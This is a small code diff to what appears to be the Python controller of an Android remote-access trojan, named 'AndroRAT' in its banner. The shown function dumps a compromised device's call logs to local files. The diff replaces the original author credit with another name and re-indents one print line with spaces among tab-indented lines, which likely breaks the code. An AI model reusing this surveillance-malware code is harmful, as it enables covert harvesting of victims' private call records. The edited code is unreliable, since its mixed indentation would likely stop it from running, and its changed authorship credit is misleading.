@@ -26,7 +26,7 @@ banner = """\033[1m\033[91m
  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
 /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|
 
-                                       \033[93m- By karma9874
+                                       \033[93m- By Tarmica
 """
 
 pattern = '\"(\\d+\\.\\d+).*\"'
@@ -283,7 +283,7 @@ def callLogs(client):
     filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
     if "No call logs" in msg:
     	msg.split("\n")
-    	print(msg.replace("END123","").strip())
+        print(msg.replace("END123","").strip())
     	print(" ")
     else:
     	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
